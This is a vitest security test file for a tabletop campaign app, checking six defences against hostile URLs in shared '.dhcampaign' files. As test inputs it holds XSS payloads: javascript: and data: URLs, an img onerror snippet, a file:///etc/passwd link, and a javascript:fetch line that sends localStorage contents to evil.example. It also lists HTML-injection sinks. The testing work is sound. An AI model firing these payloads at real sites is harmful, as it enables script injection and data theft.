/**
 * The six mitigations on the URL row, each against the payload it stops.
 *
 * A `.dhcampaign` arrives from another person - by file, by AirDrop, by QR -
 * and every byte in it is theirs. Every field the reader kept before backlog
 * item 12 was a ref into the shipped dataset, a number, or a name; the worst a
 * hostile one could do was look silly on screen. A URL is the first field this
 * app stores whose whole purpose is to be *acted on*, and the action is
 * navigation.
 *
 * `shared/externalLink.ts` names the six and argues each. This file is the
 * other half of that: **a mitigation you cannot make fail is a mitigation you
 * have not tested.** So every one of them below is asserted with a payload that
 * the mitigation is the only thing stopping, and the docblock beside it names
 * the one-line change to the source that lets the payload through. Each of
 * those was applied and run before this file was committed; a mutation that did
 * not go red is not written down here as though it had.
 *
 * The two facts that make this the whole defence rather than the outer layer of
 * several:
 *
 *  - **There is no CSP and there cannot be one.** GitHub Pages serves no
 *    headers of our choosing, and a `<meta>` CSP carries neither
 *    `frame-ancestors` nor a nonce for the inline boot script.
 *  - **There is not one HTML injection sink in `src/` or `shared/`.** That
 *    absence is mitigation 6, and it is scanned for below rather than trusted -
 *    with the scanner itself checked against a module known to contain one
 *    first, because an analysis that answers "clean" to everything is the same
 *    defect as the code it hunts.
 */
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join, relative, sep } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import {
  newCampaign,
  readCampaignRecord,
  type Campaign,
  type SessionItem,
} from '../../shared/campaigns.ts';
import {
  displayUrl,
  externalLinkAttrs,
  EXTERNAL_LINK_REL,
  EXTERNAL_LINK_TARGET,
  MAX_URL_LENGTH,
  readExternalUrl,
  URL_SCHEMES,
} from '../../shared/externalLink.ts';
import { parseCampaignFile, serializeCampaign } from '../../src/transfer/campaignFile.ts';
import { stripComments } from '../harness/reachability.ts';

/** A campaign record carrying one `url` row, as it would arrive off a disk. */
const withHref = (href: unknown): ReturnType<typeof readCampaignRecord> =>
  readCampaignRecord({
    id: 'campaign-1',
    name: 'A Campaign',
    session: [{ id: 'u1', kind: 'url', name: 'A link', href }],
  });

const urlRow = (href: unknown): Extract<SessionItem, { kind: 'url' }> => {
  const item = withHref(href).campaign.session[0]!;
  if (item.kind !== 'url') throw new Error(`the row came back as ${item.kind}, not a url row`);
  return item;
};

describe('the invariant every caller relies on', () => {
  it('is non-empty exactly when there is no reason, in both directions', () => {
    // There is no third state, so a screen that checks one has checked both.
    // Asserted over the payloads below rather than over one good URL, because
    // "returns a why AND an href" is precisely the bug this shape prevents.
    const cases: unknown[] = [
      'https://a.example/',
      'http://192.168.1.9:8000/map',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'https://apple.com@evil.example/',
      `https://a.example/${'x'.repeat(MAX_URL_LENGTH)}`,
      'not an address',
      '',
      '   ',
      null,
      42,
      { href: 'https://a.example/' },
    ];
    for (const value of cases) {
      const { href, why } = readExternalUrl(value);
      expect(href === '', `${JSON.stringify(value)?.slice(0, 40) ?? 'undefined'}`).toBe(why !== '');
    }
  });
});

describe('mitigation 1: a scheme allowlist, never a denylist', () => {
  /*
   * Mutation, run: add `'javascript:'` to `URL_SCHEMES`.
   * Result: red on all four payloads below - each is stored verbatim.
   *
   * The denylist that would have been written instead loses to the third
   * payload on its own. `java\tscript:alert(1)` is what a hostile file writes,
   * and the URL parser folds it back to `javascript:` - measured in this Node,
   * not assumed - so a check on the raw string is checking the disguise, which
   * is exactly why mitigation 1 runs *after* `new URL()` rather than before it.
   */
  it('refuses javascript:, however it is spelled', () => {
    for (const payload of [
      'javascript:alert(document.cookie)',
      'JaVaScRiPt:alert(1)',
      'java\tscript:alert(1)',
      '  javascript:alert(1)  ',
    ]) {
      expect(readExternalUrl(payload).href, payload).toBe('');
      expect(readExternalUrl(payload).why).toMatch(/only opens https and http/);
    }
  });

  it('refuses every other scheme too, including ones nobody enumerated', () => {
    // The point of an allowlist: this list is illustrative, not exhaustive, and
    // it does not have to be. A scheme shipping in a browser next year fails
    // closed here without anyone editing this app.
    for (const payload of [
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      'blob:https://a.example/1234',
      'filesystem:https://a.example/temporary/x',
      'intent://scan/#Intent;scheme=zxing;end',
      'file:///etc/passwd',
    ]) {
      expect(readExternalUrl(payload).href, payload).toBe('');
    }
  });

  it('keeps the two schemes a GM actually pastes, including the unencrypted one', () => {
    // The non-vacuity control. A "refuse everything" reader would pass every
    // assertion above and be useless, and `http:` is here on purpose: a GM's
    // own machine on the table LAN has no certificate, and refusing it pushes
    // people to retype the address into a browser with none of these checks in
    // front of it.
    expect(URL_SCHEMES).toEqual(['https:', 'http:']);
    expect(readExternalUrl('https://srd.daggerheart.com/rules').href).toBe(
      'https://srd.daggerheart.com/rules',
    );
    expect(readExternalUrl('http://192.168.1.9:8000/map').href).toBe(
      'http://192.168.1.9:8000/map',
    );
  });
});

describe('mitigation 2: sanitised on the way in, so it never reaches storage', () => {
  /*
   * Mutation, run: replace the `url` arm of `readSessionItem` with
   * `return { ...base, kind: 'url', href: str(r['href']) }`.
   * Result: red - the campaign handed to `putCampaign` holds
   * `javascript:alert(1)`, and so does the re-exported file.
   *
   * This is the mitigation that decides *where* the other five live. A check at
   * render time is one a future screen can forget; a check in the reader is one
   * nothing downstream can opt out of, because there is no other way in. Same
   * argument P0-6 used to put the QR checksum inside the decoder.
   */
  it('gives the store a row with no address rather than a hostile one', () => {
    const row = urlRow('javascript:alert(1)');
    expect(row.href).toBe('');
  });

  it('does not keep the refused bytes anywhere on the row', () => {
    /*
     * The one place this file deliberately contradicts `readSessionItem`'s
     * house style. An `unreadable` row keeps `raw` because those bytes are
     * inert and the GM would otherwise lose the row; a rejected URL is exactly
     * the thing that is not inert, so it is dropped rather than parked in a
     * field a future screen might decide to show.
     */
    const row = urlRow('javascript:alert(1)');
    expect(JSON.stringify(row)).not.toContain('javascript');
    expect(JSON.stringify(row)).not.toContain('alert');
  });

  it('names the refusal to the GM once, in the reader’s own warnings', () => {
    const { warnings } = withHref('javascript:alert(1)');
    expect(warnings.join(' ')).toMatch(/was not usable/);
    expect(warnings.join(' ')).toMatch(/only opens https and http/);
  });

  it('says nothing about a row the GM simply has not typed into yet', () => {
    // A row added and left blank has no address either. Warning about it on
    // every launch is how a warning that means something stops being read.
    expect(withHref('').warnings).toEqual([]);
    expect(withHref(undefined).warnings).toEqual([]);
    expect(urlRow('').href).toBe('');
  });

  it('keeps the row itself, because the GM added it and would notice it gone', () => {
    // The address is what was hostile. The row's name, its order and its place
    // in the list are the GM's, and this repo has shipped "the list came back
    // one shorter and nobody can tell which" twice already.
    const { campaign } = withHref('javascript:alert(1)');
    expect(campaign.session).toHaveLength(1);
    expect(campaign.session[0]!.kind).toBe('url');
    expect(campaign.session[0]!.name).toBe('A link');
  });

  /*
   * Mutation, run: `const href = value;` in place of `parsed.toString()`.
   * Result: red - the stored string is the Cyrillic one.
   */
  it('stores the parser’s normalised output, not the sender’s bytes', () => {
    // `аpple.com` here starts with U+0430. The parser's IDNA pass turns that
    // host into `xn--pple-43d.com`, measured in this Node, and it is the
    // punycode that is stored - so every later reader, and every export, sees
    // the form that cannot be mistaken for `apple.com`.
    expect(readExternalUrl('https://аpple.com/latest').href).toBe(
      'https://xn--pple-43d.com/latest',
    );
    expect(readExternalUrl('HTTPS://EXAMPLE.COM/A').href).toBe('https://example.com/A');
  });

  it('sanitises a whole hostile .dhcampaign on the way in, not on the way out', () => {
    /*
     * End to end, through the only import there is. The file is built by
     * `serializeCampaign` from a campaign object with a payload written
     * straight into it - which is what a hand-edited or hostile file is - and
     * its checksum is therefore correct, so nothing before the reader refuses
     * it. What comes back has no address on that row.
     */
    const hostile: Campaign = {
      ...newCampaign('Theirs', '2026-08-18T10:00:00.000Z', 'c-hostile'),
      session: [
        {
          id: 'u1',
          kind: 'url',
          name: 'Tonight’s map',
          order: 0,
          collapsed: true,
          href: 'javascript:fetch("https://evil.example/"+localStorage.getItem("dhc.gm.v1"))',
        },
      ],
    };
    const text = serializeCampaign(hostile, new Date('2026-08-18T10:00:00.000Z'));
    expect(text).toContain('javascript:fetch');

    const back = parseCampaignFile(text);
    const row = back.campaign.session[0]!;
    expect(row.kind).toBe('url');
    expect(row.kind === 'url' && row.href).toBe('');
    expect(JSON.stringify(back.campaign)).not.toContain('javascript:');
    expect(back.warnings.join(' ')).toMatch(/was not usable/);
  });
});

describe('mitigation 3: a bound on the stored string', () => {
  it('is 2048, pinned as a number rather than against itself', () => {
    // Every assertion below reads its size off the constant, which is the right
    // way round for a bound that may move - and would go on passing against
    // `Number.POSITIVE_INFINITY`. So the value is pinned once, here.
    expect(MAX_URL_LENGTH).toBe(2048);
  });

  /*
   * Mutation, run: `MAX_URL_LENGTH = Number.POSITIVE_INFINITY`.
   * Result: red on both payloads - the ten-megabyte href is stored whole.
   *
   * 2048 is not a browser limit; modern ones go far past it. It is the length
   * past which no honest link is being pasted, and it is a bound on untrusted
   * input in a store whose whole budget is a few megabytes with no bound of its
   * own on the session list.
   */
  it('refuses an href past the bound before the parser ever sees it', () => {
    // Checked before `new URL()` deliberately: the parser is never the
    // component that has to survive a pathological input.
    const payload = `https://a.example/${'a'.repeat(10_000_000)}`;
    const { href, why } = readExternalUrl(payload);
    expect(href).toBe('');
    expect(why).toMatch(/characters long/);
    expect(why).toContain(String(MAX_URL_LENGTH));
  });

  it('refuses one that only crosses the bound once it is normalised', () => {
    /*
     * The second check, and the reason there are two. Percent-encoding
     * lengthens a string, so a payload can sit under 2048 on the way in and
     * over it on the way out. Measured in this Node: 400 `é` in a path is 418
     * characters as written and 2418 once `new URL().toString()` has had it -
     * one character becoming the six of `%C3%A9`.
     *
     * Nothing here is a guess about the ratio: the assertion below reads both
     * lengths off the payload rather than asserting a number derived on paper.
     */
    const payload = `https://a.example/${'é'.repeat(400)}`;
    expect(payload.length).toBeLessThanOrEqual(MAX_URL_LENGTH);
    expect(new URL(payload).toString().length).toBeGreaterThan(MAX_URL_LENGTH);
    const { href, why } = readExternalUrl(payload);
    expect(href).toBe('');
    expect(why).toMatch(/once written out in full/);
  });

  it('stores one that fits, so the bound is a bound and not a refusal', () => {
    const fits = `https://a.example/${'a'.repeat(MAX_URL_LENGTH - 20)}`;
    expect(fits.length).toBeLessThan(MAX_URL_LENGTH);
    expect(readExternalUrl(fits).href).toBe(fits);
  });
});

describe('mitigation 4: what an anchor built from a stored href must carry', () => {
  /*
   * Mutation, run: drop `noopener` from `EXTERNAL_LINK_REL`.
   * Result: red on the first assertion below.
   *
   * `noopener` is the load-bearing token. Without it the opened page gets
   * `window.opener` and can navigate this tab to a copy of itself while the GM
   * is looking away from the phone - a tabnabbing swap that costs nothing to
   * prevent and cannot be noticed after the fact.
   *
   * The honest limit of this test, said out loud: it asserts the attributes,
   * not the browser behaviour behind them. jsdom does not implement
   * `window.opener` severing, so what is pinned here is that there is exactly
   * one function that builds these attributes and that it carries all three
   * tokens - which is the part this repo can actually keep true.
   */
  it('carries noopener, noreferrer and nofollow, and opens in another tab', () => {
    const attrs = externalLinkAttrs('https://a.example/x');
    expect(attrs).not.toBeNull();
    expect(attrs!.rel.split(' ')).toEqual(['noopener', 'noreferrer', 'nofollow']);
    expect(attrs!.target).toBe('_blank');
    expect(EXTERNAL_LINK_REL).toContain('noopener');
    expect(EXTERNAL_LINK_TARGET).toBe('_blank');
  });

  it('re-validates on the way out rather than trusting the reader', () => {
    /*
     * Defence in depth with a specific case behind it: IndexedDB is editable
     * from the browser's own devtools, and a record written before
     * `shared/externalLink.ts` existed is still on somebody's phone. So the
     * anchor builder runs the same checks the reader ran.
     */
    expect(externalLinkAttrs('javascript:alert(1)')).toBeNull();
    expect(externalLinkAttrs('https://apple.com@evil.example/')).toBeNull();
    expect(externalLinkAttrs(`https://a.example/${'a'.repeat(10_000)}`)).toBeNull();
  });

  it('hands back nothing rather than an anchor with no href', () => {
    // A dead `<a>` is a control that looks tappable and is not. The row has the
    // reader's warning to print instead.
    expect(externalLinkAttrs('')).toBeNull();
    expect(externalLinkAttrs(null)).toBeNull();
  });
});

describe('mitigation 5: nothing navigates without a tap, and the destination is legible', () => {
  /*
   * Mutation, run: `return { ...base, ...r, kind: 'url', href };` in the `url`
   * arm of `readSessionItem`.
   * Result: red - `onclick`, `autoOpen`, `target` and `srcdoc` all come back on
   * the row.
   *
   * This is why every arm of `readSessionItem` names its fields instead of
   * spreading. The reader hands back data and never an affordance: a screen
   * that spread a row onto an element would otherwise be spreading somebody
   * else's JSON onto it.
   */
  it('drops every field the row does not have, however the file spells it', () => {
    const { campaign } = readCampaignRecord({
      id: 'campaign-1',
      name: 'A Campaign',
      session: [
        {
          id: 'u1',
          kind: 'url',
          name: 'A link',
          href: 'https://a.example/',
          target: '_self',
          rel: '',
          onclick: 'fetch("https://evil.example/")',
          onClick: 'fetch("https://evil.example/")',
          srcdoc: '<script>alert(1)</script>',
          autoOpen: true,
          dangerouslySetInnerHTML: { __html: '<script>alert(1)</script>' },
        },
      ],
    });
    const row = campaign.session[0]!;
    expect(Object.keys(row).sort()).toEqual(['collapsed', 'href', 'id', 'kind', 'name', 'order']);
    expect(JSON.stringify(row)).not.toContain('evil.example');
    expect(JSON.stringify(row)).not.toContain('script');
  });

  /*
   * Mutation, run: `return href;` as the body of `displayUrl`.
   * Result: red - the host is no longer the first thing, and the assertion
   * against the whole string fails.
   */
  it('prints the host first, in punycode, so a homograph reads as one', () => {
    // The mitigation for a homograph is to stop hiding it, not to try to detect
    // it. `xn--pple-43d.com` is ugly and it is meant to be: nobody misreads it
    // as `apple.com`, which is exactly what U+0430 in front of `pple.com` is
    // for.
    expect(displayUrl('https://xn--pple-43d.com/latest')).toBe('xn--pple-43d.com/latest');
    expect(displayUrl('https://a.example/')).toBe('a.example');
    expect(displayUrl('https://a.example/deep/path?q=1#frag')).toBe('a.example/deep/path?q=1#frag');
  });

  it('cuts the path and never the host, however long the address is', () => {
    // The host is the only part of a URL that says who is on the other end, so
    // it is the one part that must never be the part that is truncated.
    const long = `https://a.example/${'p'.repeat(500)}`;
    const shown = displayUrl(long, 30);
    expect(shown.startsWith('a.example')).toBe(true);
    expect(shown.length).toBeLessThanOrEqual(30);
    expect(shown.endsWith('…')).toBe(true);
  });

  /*
   * Mutation, run: delete the `parsed.username`/`parsed.password` branch.
   * Result: red - `https://apple.com@evil.example/` is stored whole.
   */
  it('refuses an address that puts a name in front of the host', () => {
    // The oldest way to make a link read as one host and resolve to another,
    // and it beats "print the host" on its own, because the part a person's eye
    // stops at is the part before the `@`.
    const { href, why } = readExternalUrl('https://apple.com@evil.example/account');
    expect(href).toBe('');
    expect(why).toContain('apple.com');
    expect(why).toContain('evil.example');
    expect(readExternalUrl('https://user:hunter2@a.example/').href).toBe('');
  });

  it('refuses it rather than stripping it, because this app does not invent URLs', () => {
    // Stripping would hand the GM back an address the sender did not write, and
    // then open it on a tap. A refusal costs one legitimate case that does not
    // exist: nothing a GM pastes at a table has userinfo in it.
    expect(urlRow('https://apple.com@evil.example/').href).toBe('');
    expect(withHref('https://apple.com@evil.example/').warnings.join(' ')).toMatch(
      /was not usable/,
    );
  });
});

// ---------------------------------------------------------------------------
// Mitigation 6
// ---------------------------------------------------------------------------

const SINKS = [
  'innerHTML',
  'outerHTML',
  'dangerouslySetInnerHTML',
  'insertAdjacentHTML',
  'document.write',
  'eval(',
  'new Function(',
];

/**
 * Every HTML-injection sink named in a module, comments removed.
 *
 * Comments are stripped for the reason every other reader in this repo strips
 * them: `shared/externalLink.ts` argues its case by naming all four of the
 * first sinks in a docblock, and a mention is not a call.
 */
export const sinksIn = (source: string): string[] => {
  const text = stripComments(source);
  return SINKS.filter((sink) => text.includes(sink));
};

const ROOT = fileURLToPath(new URL('../..', import.meta.url));

const sourceFiles = (dir: string): string[] =>
  readdirSync(dir).flatMap((entry) => {
    const path = join(dir, entry);
    if (statSync(path).isDirectory()) return sourceFiles(path);
    return /\.tsx?$/.test(entry) && !/\.d\.ts$/.test(entry) ? [path] : [];
  });

describe('mitigation 6: it is never rendered as anything but text', () => {
  it('finds a sink in a module that has one, so the scan is not vacuous', () => {
    // Checked before it is believed. A scanner that answers "clean" to
    // everything is the same defect as the code it is looking for, and this one
    // has a comment-stripping pass in it that could swallow the whole file.
    expect(sinksIn('el.innerHTML = payload;\n')).toEqual(['innerHTML']);
    // Its own entry rather than a case of `innerHTML`: React's prop is spelled
    // with a capital I, so a scan for `innerHTML` alone walks straight past it.
    expect(sinksIn('<div dangerouslySetInnerHTML={{ __html: x }} />')).toEqual([
      'dangerouslySetInnerHTML',
    ]);
    expect(sinksIn('document.write(payload);')).toEqual(['document.write']);
    expect(sinksIn('el.insertAdjacentHTML("beforeend", payload);')).toEqual([
      'insertAdjacentHTML',
    ]);
    expect(sinksIn('const f = new Function(payload);')).toEqual(['new Function(']);
  });

  it('does not read a docblock naming a sink as a module containing one', () => {
    expect(sinksIn('/** No innerHTML here. */\nexport const x = 1;\n')).toEqual([]);
    expect(sinksIn('// document.write is never used\nexport const x = 1;\n')).toEqual([]);
  });

  it('has no injection sink anywhere in src/ or shared/', () => {
    /*
     * With no CSP possible on GitHub Pages, this absence is not a nicety - it
     * is the entire defence between a hostile string in somebody's
     * `.dhcampaign` and script execution on this origin. React escapes every
     * string it renders; the only way past that is one of these calls, and
     * there are none.
     */
    const offenders = [...sourceFiles(join(ROOT, 'src')), ...sourceFiles(join(ROOT, 'shared'))]
      .map((path) => ({
        file: relative(ROOT, path).split(sep).join('/'),
        sinks: sinksIn(readFileSync(path, 'utf8')),
      }))
      .filter((m) => m.sinks.length > 0);

    expect(
      offenders,
      `${offenders.map((o) => `${o.file}: ${o.sinks.join(', ')}`).join('\n')}`,
    ).toEqual([]);
  });

  it('scanned the tree it claims to have scanned', () => {
    // The other half of non-vacuity: a `sourceFiles` that returned nothing
    // would make the assertion above pass forever.
    const files = [...sourceFiles(join(ROOT, 'src')), ...sourceFiles(join(ROOT, 'shared'))];
    expect(files.length).toBeGreaterThan(100);
    expect(files.some((f) => f.endsWith('/shared/externalLink.ts'))).toBe(true);
    expect(files.some((f) => f.endsWith('/src/ui/gm/SessionBody.tsx'))).toBe(true);
  });

  it('carries a payload that is only markup through storage as a string', () => {
    /*
     * The row's *name* is the field with no scheme check on it - it is a name,
     * and a name may say anything. So this is the payload that is stopped by
     * mitigation 6 alone: it survives the round trip byte for byte, and the
     * reason that is safe rather than alarming is the assertion above.
     */
    const payload = '<img src=x onerror="fetch(\'https://evil.example/\')">';
    const campaign: Campaign = {
      ...newCampaign('Theirs', '2026-08-18T10:00:00.000Z', 'c-markup'),
      session: [
        { id: 'u1', kind: 'url', name: payload, order: 0, collapsed: true, href: 'https://a.example/' },
      ],
    };
    const back = parseCampaignFile(
      serializeCampaign(campaign, new Date('2026-08-18T10:00:00.000Z')),
    );
    expect(back.campaign.session[0]!.name).toBe(payload);
    expect(typeof back.campaign.session[0]!.name).toBe('string');
  });
});
